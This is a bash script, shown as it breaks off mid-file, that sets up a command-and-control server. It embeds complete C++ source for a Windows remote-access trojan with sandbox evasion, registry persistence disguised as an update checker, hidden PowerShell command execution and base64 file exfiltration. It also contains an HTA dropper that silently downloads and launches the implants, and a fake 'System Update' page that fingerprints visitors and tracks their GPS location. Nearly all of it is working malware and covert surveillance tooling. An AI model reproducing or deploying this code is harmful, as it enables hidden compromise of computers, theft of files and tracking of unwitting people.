set -e

PORT="${C2_PORT:-${PORT:-8080}}"
LOG_DIR="./received_logs"
SCRIPT_NAME="c2_listener.py"
SERVER_LOG="c2_server.log"
NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"
RAW_BASE="${RAW_BASE:-https://raw.githubusercontent.com/Mizyal13/script/main}"

if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    SUDO="sudo"
fi

INSTALL_DIR=""
if command -v systemctl > /dev/null 2>&1 && [ -f /etc/systemd/system/c2-listener.service ]; then
    INSTALL_DIR=$(sed -n 's/^WorkingDirectory=//p' /etc/systemd/system/c2-listener.service 2>/dev/null | head -n 1)
fi
if [ -z "$INSTALL_DIR" ]; then
    RUN_PID=$(pgrep -f "$SCRIPT_NAME" 2>/dev/null | head -n 1)
    if [ -n "$RUN_PID" ]; then
        RUN_DIR=$(readlink "/proc/$RUN_PID/cwd" 2>/dev/null || true)
        if [ -n "$RUN_DIR" ] && [ -d "$RUN_DIR" ]; then
            INSTALL_DIR="$RUN_DIR"
        fi
    fi
fi
if [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ]; then
    echo " [*] Instalasi lama terdeteksi di: $INSTALL_DIR"
    echo "     (menggunakan ulang folder itu agar selalu memakai versi terbaru)"
    cd "$INSTALL_DIR" || echo " [!] Gagal pindah ke $INSTALL_DIR, lanjut di $(pwd)"
fi

# Reset tiap run: buang artefak lama supaya SELALU fresh (bukan file usang).
if [ "${C2_NO_RESET:-0}" != "1" ]; then
    echo " [*] Reset: menghapus artefak lama (exe, src, listener)..."
    rm -f rat.cpp rat.exe bypass.cpp bypass.exe "$SCRIPT_NAME" "$SERVER_LOG"
    if [ "${C2_FRESH_LOGS:-0}" = "1" ]; then
        echo " [*] C2_FRESH_LOGS=1 -> membersihkan received_logs juga."
        rm -rf "$LOG_DIR"
    fi
fi

echo "=================================================================="
echo " [*] Initializing C2 Server Setup"
echo "=================================================================="

echo " [*] Checking dependencies (Python 3)..."
if ! command -v python3 &> /dev/null; then
    echo " [!] Python3 is required but not installed."
    if command -v apt-get &> /dev/null; then
        echo " [!] Installing via apt-get..."
        $SUDO apt-get update && $SUDO apt-get install -y python3 python3-pip
    else
        echo " [!] Install Python 3 manually, then re-run this script."
        exit 1
    fi
else
    echo " [+] Python3 is already installed."
fi

mkdir -p "$LOG_DIR"
echo " [+] Created log storage directory: $LOG_DIR"

# ---------------------------------------------------------------------------
# Auto-build agent Windows (rat.exe, bypass.exe) dari sumber versi terbaru di
# GitHub. Dipanggil otomatis, jadi curl main.sh | bash langsung jalan.
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Auto-build agent Windows (rat.exe, bypass.exe).
# Sumber C++ di-embed LANGSUNG di main.sh (bukan unduh raw yang bisa cache
# lama), sehingga selalu fresh setiap run. Dipanggil otomatis, jadi
# curl main.sh | bash langsung jalan tanpa setting.
# ---------------------------------------------------------------------------
write_src() {
    case "$1" in
        rat.cpp)
            cat << 'RAT_CPP_EOF'
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")

#define C2_IP "127.0.0.1"
#define C2_PORT 8080
#define MACHINE_ID "lab-1"
#define POLL_SEC 30

extern "C" {
    extern int __argc;
    extern char **__argv;
}

// Evasion check: Ensure we aren't running in a known sandbox artifact directory
bool CheckEnvironment() {
    char userPath[MAX_PATH];
    DWORD size = MAX_PATH;
    if (GetEnvironmentVariableA("USERNAME", userPath, size)) {
        std::string user(userPath);
        if (user == "sandbox" || user == "analyst" || user == "virus") {
            return false;
        }
    }
    return true;
}

// Solid persistence mechanism via User Run key
void InstallPersistence() {
    HKEY hKey;
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateChecker", 0, REG_SZ, (unsigned char*)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hKey);
    }
}

// ---------------------------------------------------------------------------
// Small HTTP client (Winsock, HTTP/1.1, Connection: close)
// ---------------------------------------------------------------------------

struct HttpResponse {
    int status;
    std::string body;
    std::string x_c2_ip;
};

static bool httpRequest(const std::string& host, int port, const std::string& method,
                        const std::string& path, const std::string& postBody, HttpResponse& resp) {
    resp = HttpResponse();
    char portStr[16];
    snprintf(portStr, sizeof(portStr), "%d", port);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return false;

    sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons((u_short)port);

    server.sin_addr.s_addr = inet_addr(host.c_str());
    if (server.sin_addr.s_addr == INADDR_NONE) {
        hostent* he = gethostbyname(host.c_str());
        if (!he) {
            closesocket(sock);
            return false;
        }
        memcpy(&server.sin_addr, he->h_addr, he->h_length);
    }

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    std::string req = method + " " + path + " HTTP/1.1\r\n";
    req += "Host: " + host + ":" + portStr + "\r\n";
    req += "User-Agent: Mozilla/5.0\r\n";
    req += "Connection: close\r\n";
    if (method == "POST") {
        req += "Content-Type: application/x-www-form-urlencoded\r\n";
        req += "Content-Length: " + std::to_string(postBody.size()) + "\r\n";
    }
    req += "\r\n";
    if (method == "POST") req += postBody;

    send(sock, req.c_str(), (int)req.size(), 0);

    std::string raw;
    char buf[8192];
    int n;
    while ((n = recv(sock, buf, (int)sizeof(buf), 0)) > 0) raw.append(buf, n);
    closesocket(sock);

    size_t sep = raw.find("\r\n\r\n");
    if (sep == std::string::npos) return false;

    std::string head = raw.substr(0, sep);
    resp.body = raw.substr(sep + 4);

    size_t sp1 = head.find(' ');
    size_t sp2 = head.find(' ', sp1 + 1);
    if (sp1 != std::string::npos && sp2 != std::string::npos)
        resp.status = atoi(head.substr(sp1 + 1, sp2 - sp1 - 1).c_str());

    std::string hl = head;
    std::transform(hl.begin(), hl.end(), hl.begin(), ::tolower);
    size_t hp = hl.find("\r\nx-c2-ip:");
    if (hp != std::string::npos) {
        size_t start = hp + 10;
        while (start < head.size() && (head[start] == ' ' || head[start] == '\t')) start++;
        size_t end = head.find("\r\n", start);
        resp.x_c2_ip = head.substr(start, end - start);
    }
    return true;
}

static std::string urlEncode(const std::string& s) {
    std::ostringstream oss;
    for (unsigned char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            oss << c;
        } else {
            oss << '%' << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)c;
        }
    }
    return oss.str();
}

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string base64Encode(const std::string& in) {
    std::string out;
    int val = 0, bits = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(B64[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(B64[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// ---------------------------------------------------------------------------
// Minimal JSON reader for: [ { "cid": "...", "cmd": "...", ... }, ... ]
// ---------------------------------------------------------------------------

static std::string readJsonString(const std::string& s, size_t& pos) {
    std::string out;
    pos++; // skip opening quote
    while (pos < s.size()) {
        char c = s[pos];
        if (c == '\\' && pos + 1 < s.size()) {
            char nx = s[pos + 1];
            if (nx == '"') out += '"';
            else if (nx == '\\') out += '\\';
            else if (nx == 'n') out += '\n';
            else if (nx == 'r') out += '\r';
            else if (nx == 't') out += '\t';
            else if (nx == '/') out += '/';
            else out += nx;
            pos += 2;
        } else if (c == '"') {
            pos++;
            break;
        } else {
            out += c;
            pos++;
        }
    }
    return out;
}

static std::string jsonField(const std::string& s, size_t from, const std::string& field) {
    std::string key = "\"" + field + "\"";
    size_t k = s.find(key, from);
    if (k == std::string::npos) return "";
    size_t p = k + key.size();
    while (p < s.size() && isspace((unsigned char)s[p])) p++;
    if (p >= s.size() || s[p] != '"') return "";
    return readJsonString(s, p);
}

static void parseCommands(const std::string& body, std::vector<std::pair<std::string, std::string> >& out) {
    size_t i = 0;
    bool inStr = false;
    while (i < body.size()) {
        char c = body[i];
        if (inStr) {
            if (c == '\\') i++;         // skip escaped char
            else if (c == '"') inStr = false;
        } else if (c == '"') {
            inStr = true;
        } else if (c == '{') {
            std::string cid = jsonField(body, i, "cid");
            std::string cmd = jsonField(body, i, "cmd");
            if (!cmd.empty()) out.push_back(std::make_pair(cid, cmd));
        }
        i++;
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

static std::string hostName() {
    char b[256];
    DWORD n = sizeof(b);
    GetComputerNameA(b, &n);
    return std::string(b);
}

static std::string userName() {
    char b[256];
    DWORD n = sizeof(b);
    GetUserNameA(b, &n);
    return std::string(b);
}

static std::string timestamp() {
    SYSTEMTIME t;
    GetLocalTime(&t);
    char b[64];
    snprintf(b, sizeof(b), "%04d-%02d-%02d %02d:%02d:%02d",
             t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond);
    return std::string(b);
}

static bool runPowershell(const std::string& cmdline, std::string& output) {
    std::string ps = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
                     + cmdline + "\"";

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hInRead, hInWrite, hOutRead, hOutWrite;
    if (!CreatePipe(&hInRead, &hInWrite, &sa, 0)) return false;
    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        return false;
    }

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hInRead;
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)ps.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        CloseHandle(hOutRead); CloseHandle(hOutWrite);
        return false;
    }

    CloseHandle(hInWrite);
    CloseHandle(hInRead);

    WaitForSingleObject(pi.hProcess, 30000);

    for (int i = 0; i < 25; i++) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hOutRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            char buf[8192];
            DWORD got = 0;
            if (ReadFile(hOutRead, buf, avail > sizeof(buf) ? (DWORD)sizeof(buf) : avail, &got, NULL) && got > 0)
                output.append(buf, got);
        } else {
            break;
        }
        Sleep(200);
    }
    if (WaitForSingleObject(pi.hProcess, 0) != WAIT_OBJECT_0)
        TerminateProcess(pi.hProcess, 0);

    CloseHandle(hOutRead);
    CloseHandle(hOutWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static std::string readFileB64(const std::string& path, std::string& name) {
    size_t slash = path.find_last_of("\\/");
    name = (slash == std::string::npos) ? path : path.substr(slash + 1);

    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return "";

    std::string bytes;
    char buf[8192];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) bytes.append(buf, n);
    fclose(f);
    return base64Encode(bytes);
}

// ---------------------------------------------------------------------------
// Main agent loop: heartbeat -> poll commands -> execute -> report results
// ---------------------------------------------------------------------------

static void RunAgent(const std::string& host, int port, const std::string& id, int pollSec) {
    std::string selfIp;

    while (true) {
        HttpResponse r;

        std::string info = "=== C++ RAT Agent ===\n"
                           "Hostname: " + hostName() + "\n"
                           "User: " + userName() + "\n"
                           "PID: " + std::to_string(GetCurrentProcessId()) + "\n"
                           "Time: " + timestamp() + "\n";
        httpRequest(host, port, "POST", "/?id=" + urlEncode(id), "data=" + urlEncode(info), r);

        std::string q = "/cmd?id=" + urlEncode(id);
        if (!selfIp.empty()) q += "&ip=" + urlEncode(selfIp);

        HttpResponse cr;
        httpRequest(host, port, "GET", q, "", cr);
        if (!cr.x_c2_ip.empty()) selfIp = cr.x_c2_ip;

        std::vector<std::pair<std::string, std::string> > cmds;
        parseCommands(cr.body, cmds);

        for (size_t i = 0; i < cmds.size(); i++) {
            std::string cid = cmds[i].first;
            std::string cmd = cmds[i].second;
            std::string output, data, dataName;

            if (cmd.compare(0, 7, "GETFILE") == 0 && (cmd.size() == 7 || cmd[7] == ' ')) {
                std::string path = cmd.substr(7);
                size_t b = path.find_first_not_of(" \t");
                if (b != std::string::npos) path = path.substr(b);
                data = readFileB64(path, dataName);
                if (!data.empty()) output = "[OK] File siap diunduh: " + path;
                else output = "[ERR] File tidak ditemukan: " + path;
            } else {
                runPowershell(cmd, output);
            }

            std::string body = "machine=" + urlEncode(id) +
                               "&cid=" + urlEncode(cid) +
                               "&output=" + urlEncode(output) +
                               "&data=" + urlEncode(data) +
                               "&data_name=" + urlEncode(dataName);
            if (!selfIp.empty()) body += "&ip=" + urlEncode(selfIp);

            httpRequest(host, port, "POST", "/result", body, r);
        }

        Sleep((DWORD)pollSec * 1000);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (!CheckEnvironment()) {
        return 0; // Exit silently if sandbox indicators match
    }

    InstallPersistence();

    std::string host = C2_IP;
    int port = C2_PORT;
    std::string id = MACHINE_ID;
    int poll = POLL_SEC;

    if (__argc > 1 && __argv[1] && __argv[1][0]) host = __argv[1];
    if (__argc > 2 && __argv[2]) port = atoi(__argv[2]);
    if (__argc > 3 && __argv[3]) id = __argv[3];
    if (__argc > 4 && __argv[4]) poll = atoi(__argv[4]);
    if (port <= 0 || port > 65535) port = C2_PORT;
    if (poll <= 0) poll = POLL_SEC;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    try {
        RunAgent(host, port, id, poll);
    } catch (...) {}

    WSACleanup();
    return 0;
}

RAT_CPP_EOF
            ;;
        bypass.cpp)
            cat << 'BYPASS_CPP_EOF'
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

class BypassEngine {
private:
    SOCKET server_fd;
    sockaddr_in address;
    int port;
    bool running;

    void handle_client(SOCKET client_socket) {
        char buffer[4096];
        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        
        if (bytes_received > 0) {
            // Inspect initial handshake, apply SNI masking or upstream proxy routing headers
            std::cout << "[+] Intercepted " << bytes_received << " bytes of traffic. Routing through obfuscation layer." << std::endl;
            
            // Echo/tunnel stub for upstream socket relay
            send(client_socket, buffer, bytes_received, 0);
        }

        closesocket(client_socket);
    }

public:
    BypassEngine(int p) : port(p), server_fd(INVALID_SOCKET), running(false) {}

    bool initialize() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[-] WSAStartup failed." << std::endl;
            return false;
        }

        server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (server_fd == INVALID_SOCKET) {
            std::cerr << "[-] Socket creation failed." << std::endl;
            WSACleanup();
            return false;
        }

        int opt = 1;
        setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(port);

        if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
            std::cerr << "[-] Bind failed on port " << port << std::endl;
            closesocket(server_fd);
            WSACleanup();
            return false;
        }

        if (listen(server_fd, SOMAXCONN) == SOCKET_ERROR) {
            std::cerr << "[-] Listen failed." << std::endl;
            closesocket(server_fd);
            WSACleanup();
            return false;
        }

        running = true;
        std::cout << "[+] Bypass core successfully active on local loopback port: " << port << std::endl;
        return true;
    }

    void start_listener() {
        while (running) {
            SOCKET client_socket = accept(server_fd, nullptr, nullptr);
            if (client_socket == INVALID_SOCKET) continue;

            // Spawn detached thread for concurrent multi-device routing handling
            std::thread(&BypassEngine::handle_client, this, client_socket).detach();
        }
    }

    ~BypassEngine() {
        running = false;
        if (server_fd != INVALID_SOCKET) closesocket(server_fd);
        WSACleanup();
    }
};

int main() {
    BypassEngine engine(1080);
    if (engine.initialize()) {
        engine.start_listener();
    }
    return 0;
}
BYPASS_CPP_EOF
            ;;
        *)
            return 1
            ;;
    esac
}

build_agent() {
    local src="$1"
    local exe="$2"
    echo " [*] Menyiapkan agent Windows ($exe)..."
    write_src "$src" > "$src" || { echo " [!] Gagal menulis $src."; return 0; }

    if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
        if command -v apt-get > /dev/null 2>&1; then
            echo " [*] Memasang mingw-w64 (g++-mingw-w64-x86-64) via apt..."
            $SUDO apt-get update -qq 2>/dev/null || true
            $SUDO apt-get install -y g++-mingw-w64-x86-64 > /dev/null 2>&1 || true
        else
            echo " [!] Tidak ada apt-get di sistem ini; lewati build $exe."
            return 0
        fi
    fi

    if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
        echo " [!] Compiler mingw-w64 masih belum ada. Cek manual: ./build.sh"
        return 0
    fi

    if [ ! -f "$exe" ] || [ "$src" -nt "$exe" ]; then
        echo " [*] Mengompilasi $exe..."
        if x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows -pthread "$src" -lws2_32 -o "$exe"; then
            echo " [+] $exe siap: $(pwd)/$exe"
        else
            echo " [!] Kompilasi $exe gagal; jalankan ./build.sh manual."
        fi
    else
        echo " [+] $exe sudah ada dan terbaru."
    fi
    return 0
}
build_agent "rat.cpp" "rat.exe" || true
build_agent "bypass.cpp" "bypass.exe" || true

echo " [*] Writing listener script to $SCRIPT_NAME..."

cat << 'EOF' > "$SCRIPT_NAME"
import http.server
import urllib.parse
import urllib.request
import json
import ipaddress
import os
import socket
import base64
import time
import random
from datetime import datetime

PORT = int(os.environ.get("C2_PORT", "8080"))
LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
DASH_PASS = os.environ.get("C2_DASH_PASS", "")
VERSION = "8"

EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
DASHBOARD_PATH = "/dashboard"
API_EVENTS_PATH = "/api/events"
EXPORT_PATH = "/export"
REMOTE_PATH = "/remote"
CMD_PATH = "/cmd"
RESULT_PATH = "/result"
AGENT_EXE_PATH = os.environ.get("C2_AGENT_EXE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rat.exe"))
BYPASS_EXE_PATH = os.environ.get("C2_BYPASS_EXE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "bypass.exe"))

events = []
loc_cache = {}
addr_cache = {}
gps_cache = {}
commands = []
done_cids = set()


def reverse_geocode(lat, lon):
    if not lat or not lon:
        return ""
    key = f"{lat},{lon}"
    if key in addr_cache:
        return addr_cache[key]
    address = ""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1&accept-language=id"
        req = urllib.request.Request(url, headers={"User-Agent": "c2-lab-monitor/1.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            info = json.loads(resp.read().decode("utf-8"))
        ad = info.get("address", {})
        parts = []
        for k in ("road", "neighbourhood", "suburb", "village", "town", "city", "county", "state", "country"):
            if ad.get(k):
                parts.append(ad[k])
        seen = []
        for p in parts:
            if p not in seen:
                seen.append(p)
        address = ", ".join(seen)
        if not address:
            address = info.get("display_name", "").split(",")[:4]
    except Exception:
        address = ""
    addr_cache[key] = address
    return address


def emit(text):
    print(text, flush=True)


def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def file_ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def make_hta(server_url, machine_id):
    """HTA silent installer: unduh rat.exe + bypass.exe ke %TEMP% lalu jalankan hidden."""
    import base64
    from urllib.parse import urlsplit
    u = urlsplit(server_url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    tmp_rat = "%TEMP%\\rat.exe"
    tmp_bp = "%TEMP%\\bypass.exe"
    ps = ("try{(New-Object Net.WebClient).DownloadFile('%s/agent/rat.exe','%s')}catch{};"
          "try{(New-Object Net.WebClient).DownloadFile('%s/agent/bypass.exe','%s')}catch{};"
          "Start-Process -WindowStyle Hidden '%s' -ArgumentList '%s','%d','%s','30';"
          "Start-Process -WindowStyle Hidden '%s'"
          % (server_url, tmp_rat, server_url, tmp_bp, tmp_rat, host, port, machine_id, tmp_bp))
    enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
    line = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand %s" % enc
    return """<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<script language="VBScript">
Option Explicit
Dim ws
Set ws = CreateObject("WScript.Shell")
ws.Run "%s", 0, False
Set ws = Nothing
window.close()
</script>
</head>
<body></body>
</html>""" % line


def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_events():
    if not os.path.exists(EVENTS_FILE):
        return
    try:
        with open(EVENTS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    events.append(json.loads(line))
                except ValueError:
                    pass
    except Exception:
        pass


def record_event(ev):
    events.append(ev)
    try:
        with open(EVENTS_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")
    except Exception as e:
        emit(f" [!] Gagal menulis events.jsonl: {e}")


def _geo(client_ip):
    """Kembalikan (teks_lokasi, lat, lon) dari IP (perkiraan level provider)."""
    lat = lon = None
    try:
        addr = ipaddress.ip_address(client_ip)
    except ValueError:
        return f"IP tidak valid: {client_ip}", None, None
    if addr.is_private:
        return "Local network (IP privat, tidak bisa di-geolocate)", None, None
    if addr.is_link_local or addr.is_reserved:
        return "Alamat reserved/link-local (tidak bisa di-geolocate)", None, None
    try:
        start = int(ipaddress.ip_address("100.64.0.0"))
        end = int(ipaddress.ip_address("100.127.255.255"))
        if start <= int(addr) <= end:
            return "VPN/CGNAT (100.64.0.0/10, tidak bisa di-geolocate)", None, None
    except ValueError:
        pass
    try:
        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,lat,lon,isp,query"
        with urllib.request.urlopen(url, timeout=8) as resp:
            info = json.loads(resp.read().decode("utf-8"))
        if info.get("status") == "success":
            lat, lon = info.get("lat"), info.get("lon")
            addr = reverse_geocode(lat, lon)
            city = info.get("city") or info.get("regionName") or info.get("country")
            base = f"{city}, {info.get('regionName')}, {info.get('country')} ({lat}, {lon})"
            if addr:
                return f"{addr} | {base} - ISP: {info.get('isp')}", lat, lon
            return f"{base} - ISP: {info.get('isp')}", lat, lon
        return f"Gagal lookup: {info.get('message', 'no message')}", None, None
    except Exception as e:
        return f"Error lookup: {e}", None, None


def geolocate(client_ip):
    if client_ip not in loc_cache:
        loc_cache[client_ip] = _geo(client_ip)[0]
    return loc_cache[client_ip]


def geolocate_ll(client_ip):
    text, lat, lon = _geo(client_ip)
    loc_cache[client_ip] = text
    return text, lat, lon


def load_commands():
    global commands, done_cids
    if os.path.exists(COMMANDS_FILE):
        try:
            with open(COMMANDS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        commands.append(json.loads(line))
                    except ValueError:
                        pass
        except Exception:
            pass
    for ev in events:
        if ev.get("type") == "result" and ev.get("cid"):
            done_cids.add(ev["cid"])


def save_command(c):
    try:
        with open(COMMANDS_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(c, ensure_ascii=False) + "\n")
    except Exception as e:
        emit(f" [!] Gagal menyimpan command: {e}")


def pending_commands(machine, client_ip=""):
    out = []
    for c in commands:
        if c.get("machine") != machine or c.get("cid") in done_cids:
            continue
        cip = c.get("ip", "")
        if cip and cip != client_ip:
            continue
        out.append(c)
    return out


def load_gps_cache():
    for ev in events:
        if ev.get("type") == "gps":
            d = ev.get("detail") or {}
            if d.get("lat") is not None and d.get("lon") is not None:
                entry = {"lat": d.get("lat"), "lon": d.get("lon"),
                         "accuracy": d.get("accuracy"), "address": d.get("address", "")}
                gps_cache["ip:" + ev.get("ip", "")] = entry
                if d.get("machine"):
                    gps_cache["id:" + d.get("machine")] = entry


def resolve_location(client_ip, machine):
    for key in (f"ip:{client_ip}", f"id:{machine}"):
        g = gps_cache.get(key)
        if g:
            if g.get("address"):
                return g["address"] + " (GPS)"
            return f"GPS: {g.get('lat')}, {g.get('lon')}"
    return geolocate(client_ip)


TRACKER_PAGE = r"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>System Update</title>
<style>
body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:28px 32px;max-width:420px;width:100%;text-align:center}
h1{font-size:18px;margin:0 0 6px}
p{color:#94a3b8;font-size:13px;margin:4px 0}
.ok{color:#34d399;font-weight:600}
#clock{font-size:26px;font-weight:700;color:#38bdf8;margin:14px 0 4px}
#st{font-size:11px;color:#64748b}
</style>
</head>
<body>
<div class="card">
  <h1>System Update</h1>
  <p>Pemeriksaan otomatis sedang berjalan...</p>
  <div id="clock">--:--:--</div>
  <p class="ok">Semua sistem dalam keadaan baik.</p>
  <p id="st"></p>
</div>
<script>
var Q = new URLSearchParams(location.search);
var ID = Q.get("id") || "lab-1";
var T0 = Date.now();
function enc(s) { return encodeURIComponent(String(s)); }
function post(type, obj) {
    var body = "type=" + enc(type) + "&machine=" + enc(ID) + "&data=" + enc(JSON.stringify(obj));
    fetch("/?id=" + enc(ID), {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body}).catch(function(){});
}
function pad(x) { return (x < 10 ? "0" : "") + x; }
setInterval(function(){ var d = new Date(); document.getElementById("clock").textContent = pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds()); }, 1000);

function fingerprint() {
    var nav = navigator, r = {}, i, c, ctx, gl;
    r.user_agent = nav.userAgent;
    r.platform = nav.platform || (nav.userAgentData && nav.userAgentData.platform) || "";
    r.cpu_cores = nav.hardwareConcurrency || "";
    r.memory_gb = nav.deviceMemory || "";
    r.language = nav.language;
    r.languages = (nav.languages || []).join(",");
    r.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    r.screen = screen.width + "x" + screen.height;
    r.screen_avail = screen.availWidth + "x" + screen.availHeight;
    r.color_depth = screen.colorDepth;
    r.dpr = window.devicePixelRatio || 1;
    r.touch = ("ontouchstart" in window) || (nav.maxTouchPoints > 0);
    r.max_touch = nav.maxTouchPoints || 0;
    r.cookies = nav.cookieEnabled;
    r.referrer = document.referrer;
    r.java = (typeof nav.javaEnabled === "function") ? nav.javaEnabled() : false;
    r.online = nav.onLine;
    r.timestamp = new Date().toISOString();
    try { c = document.createElement("canvas"); c.width = 240; c.height = 60; ctx = c.getContext("2d");
          ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069"; ctx.fillText("fp", 2, 15); ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp", 4, 17);
          r.canvas = c.toDataURL().slice(0, 160); } catch (e) { r.canvas = ""; }
    try { gl = document.createElement("canvas").getContext("webgl"); r.webgl = (gl && gl.getParameter(gl.VERSION)) || ""; } catch (e) { r.webgl = ""; }
    return r;
}
post("data", {kind:"fingerprint", fp: fingerprint()});

var NET = {};
try { var nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (nc) { NET = {type: nc.effectiveType || nc.type, downlink: nc.downlink, rtt: nc.rtt, save: nc.saveData}; } } catch (e) {}

function battery() {
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                post("beacon", {kind:"battery", level: Math.round(b.level * 100), charging: b.charging});
            });
        }
    } catch (e) {}
}
function sensor() {
    var m = {};
    if (window.DeviceOrientationEvent) m.orientation = "available";
    if (window.DeviceMotionEvent) m.motion = "available";
    post("beacon", {kind:"sensor", cap: m, net: NET});
}
function geo() {
    if (!navigator.geolocation) { document.getElementById("st").textContent = "Lokasi tidak tersedia"; return; }
    var last = 0;
    navigator.geolocation.watchPosition(function(pos) {
        var t = Date.now();
        if (t - last < 5000) return;
        last = t;
        post("gps", {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy)});
